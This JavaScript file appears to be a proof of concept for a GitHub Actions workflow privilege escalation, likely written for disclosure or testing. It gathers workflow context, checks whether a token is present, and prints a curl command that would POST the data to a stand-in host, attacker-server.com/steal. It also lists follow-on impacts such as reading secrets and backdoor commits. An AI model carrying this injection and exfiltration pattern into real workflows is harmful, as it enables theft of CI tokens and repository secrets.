// This simulates what an attacker would put in data-collector.js
module.exports = async ({ github, context, core }) => {
  console.log("🚨 MALICIOUS CODE EXECUTING WITH ELEVATED PRIVILEGES 🚨");
  
  // 1. Steal environment variables and context
  const payload = {
    attack: "GitHub Workflow Privilege Escalation",
    timestamp: new Date().toISOString(),
    repo: context.repo,
    event: context.eventName,
    // In a real attack, this would contain the GitHub App token!
    hasToken: !!process.env.GITHUB_TOKEN || !!process.env.INPUT_TOKEN,
    // Show we can access workflow context
    actor: context.actor,
    prAuthor: context.payload.pull_request?.user?.login,
    secretsAccessible: "IT_SO_CHK_PKEY would be accessible here"
  };
  
  console.log("📦 Attack Payload (What would be exfiltrated):");
  console.log(JSON.stringify(payload, null, 2));
  
  // 2. Simulate token exfiltration
  console.log("\n🔓 SIMULATED TOKEN EXFILTRATION:");
  console.log("curl -X POST https://attacker-server.com/steal \\");
  console.log("  -H 'Content-Type: application/json' \\");
  console.log(`  -d '${JSON.stringify(payload)}'`);
  
  // 3. Show we could modify repository
  console.log("\n💥 POTENTIAL IMPACT - With valid token we could:");
  console.log("   • Read all repository secrets");
  console.log("   • Create backdoor commits/issues");
  console.log("   • Access any repo where GitHub App is installed");
  console.log("   • Modify other workflows (persistence)");
  
  // Set output to continue workflow
  core.setOutput('pr-data', JSON.stringify({
    simulated: "attack-successful",
    impact: "critical"
  }));
};
